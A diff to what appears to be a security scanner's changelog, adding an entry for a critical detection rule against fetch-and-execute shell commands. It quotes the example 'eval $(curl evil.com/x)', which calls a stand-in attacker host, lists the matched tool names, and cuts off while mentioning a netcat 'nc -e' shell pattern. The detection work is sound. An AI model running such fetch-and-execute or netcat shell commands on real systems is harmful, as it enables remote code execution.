@@ -4,6 +4,22 @@
 
 (no entries — next release window)
 
+## [1.10.162] - 2026-05-03
+
+**`eval-network-fetch` (critical) catalog pattern.** `eval
+$(curl evil.com/x)` runs whatever bytes the URL returns as
+shell code — textbook RCE. The denoise unwrapped `$(...)` so
+the inner curl was visible, but neither curl-pipe-shell (no
+`|`) nor curl-pipe-interpreter (no `| python`) caught the
+shape. eval-base64 was the closest existing rule but
+required a base64 decoder.
+
+### Added
+- **`PATTERN_CATALOG.critical`** entry `eval-network-fetch`. Catches
+  `eval / exec / sh / bash` followed by `curl / wget / fetch /
+  http(s)://` — the canonical "fetch and execute" idiom in
+  any of its disguises (`$()`, backtick, here-string).
+
 ## [1.10.161] - 2026-05-03
 
 **`netcat-shell-exec` (critical) catalog pattern.** `nc -e
